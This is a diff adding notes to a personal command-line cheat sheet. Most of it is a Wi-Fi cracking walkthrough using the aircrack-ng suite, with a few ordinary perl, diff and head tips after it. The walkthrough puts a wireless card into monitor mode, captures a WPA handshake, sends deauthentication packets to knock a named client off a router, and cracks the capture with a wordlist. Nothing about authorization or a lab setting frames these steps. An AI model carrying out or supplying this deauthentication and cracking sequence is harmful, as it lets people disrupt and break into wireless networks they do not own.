@@ -2,6 +2,47 @@
 
 
 
+# Kali Linux Commands
+
+## *************************************************************************************************
+
+
+## PEN testing 
+ * download device driver for host
+ * add device filter in virtual box
+ * airmon-ng
+ * if it doesn't show download 
+ * https://www.youtube.com/redirect?v=6cCwsno-ty4&event=video_description&redir_token=g6WYwaKHJoDB_MUujqrktQsGkAh8MTUyMzkwOTA1MEAxNTIzODIyNjUw&q=http%3A%2F%2Flinuxwireless.sipsolutions.net%2Fdownload%2Fcompat-wireless-2.6%2Fcompat-wireless-2010-06-26-p.tar.bz2
+
+		  cd into it
+		  make unload 
+		  make load
+		  airmon-ng (Do you see it? ) 
+		  airmon-ng start wlan0
+		  airodump-ng wlan0mon
+		  airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface] (airodump-ng -c 10 --bssid 00:14:BF:E0:E8:D5 -w /root/Desktop/ mon0)
+		  Leave airodump-ng running and open a second terminal. In this terminal, type this command: aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
+		  	EX. aireplay-ng –0 2 –a 00:14:BF:E0:E8:D5 –c 4C:EB:42:59:DE:31 mon0
+ 		  Open a new Terminal. Type in this command: aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+
+
+ * Scan available networks 
+
+ 	sudo iwlist scan
+
+ * Get installed wireless card info 
+
+	lspci
+	lspci | grep -i wireless
+	lspci | egrep -i --color 'wifi|wlan|wireless'
+
+ * Get wireless card driver info 
+
+ 	lspci -vv -s 0c:00.0
+
+
+## *************************************************************************************************
+
 # Perl for string replacement, because sed with OSX is weird 
  * perl -pi -w -e 's/SEARCH_FOR/REPLACE_WITH/g;' *.txt
 
@@ -29,7 +70,9 @@
 a treats all files as text, r recursively searched subdirectories, q reports 'briefly', only when files differ
  * diff -arq folder1 folder2
 will do this, telling you both if any files have been added or deleted, and what's changed in the files that have been modified.
- * diff -r 
+ 	diff -r 
+ * Show files side by side, ignore white space and capitals
+ 	diff file1 file2 -iawy
 
 # Limit number of lines in output 
 	| head -n 10
